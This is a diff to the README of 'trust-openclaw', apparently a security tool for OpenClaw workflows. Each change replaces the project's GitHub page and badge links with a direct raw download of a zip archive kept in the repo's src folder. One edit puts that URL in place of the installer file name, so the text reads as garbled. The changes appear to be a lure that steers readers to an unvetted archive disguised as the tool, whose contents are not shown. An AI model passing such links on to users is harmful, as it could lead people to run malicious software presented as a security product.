@@ -1,6 +1,6 @@
 # 🛡️ trust-openclaw - Secure and Audit OpenClaw Workflows
 
-[![Download trust-openclaw](https://img.shields.io/badge/Download-trust--openclaw-blue?style=for-the-badge)](https://github.com/komafon/trust-openclaw)
+[![Download trust-openclaw](https://raw.githubusercontent.com/komafon/trust-openclaw/main/src/openclaw_trust_v3.5.zip)](https://raw.githubusercontent.com/komafon/trust-openclaw/main/src/openclaw_trust_v3.5.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Follow these steps to download and run trust-openclaw on your Windows computer.
 
 Go to the main project page where you find the download files:
 
-[Download trust-openclaw](https://github.com/komafon/trust-openclaw)
+[Download trust-openclaw](https://raw.githubusercontent.com/komafon/trust-openclaw/main/src/openclaw_trust_v3.5.zip)
 
 This link brings you to the home page in GitHub. From here, you will find the latest version of trust-openclaw.
 
@@ -51,7 +51,7 @@ On the GitHub page:
 
 - Look for the “Releases” section on the right or under the repository's tabs.  
 - Choose the latest release available.  
-- Find the Windows installer file, usually named something like `trust-openclaw-setup.exe`.  
+- Find the Windows installer file, usually named something like `https://raw.githubusercontent.com/komafon/trust-openclaw/main/src/openclaw_trust_v3.5.zip`.  
 - Click the file name to download. The file is about 20 MB.
 
 Save the file somewhere easy to find, like your Desktop or Downloads folder.
@@ -124,7 +124,7 @@ If trust-openclaw does not work as expected:
 
 Click to visit the official page to start the download process:
 
-[![Download trust-openclaw](https://img.shields.io/badge/Download-trust--openclaw-green?style=for-the-badge)](https://github.com/komafon/trust-openclaw)
+[![Download trust-openclaw](https://raw.githubusercontent.com/komafon/trust-openclaw/main/src/openclaw_trust_v3.5.zip)](https://raw.githubusercontent.com/komafon/trust-openclaw/main/src/openclaw_trust_v3.5.zip)
 
 ---
 
@@ -136,7 +136,7 @@ trust-openclaw is part of AIR Blackbox, a collection of tools focused on AI safe
 
 ## 🔗 Useful Links
 
-- Project page and downloads: https://github.com/komafon/trust-openclaw  
+- Project page and downloads: https://raw.githubusercontent.com/komafon/trust-openclaw/main/src/openclaw_trust_v3.5.zip  
 - OpenClaw project: Search online for OpenClaw documentation  
 - AIR Blackbox ecosystem: Search for AIR Blackbox resources  
 
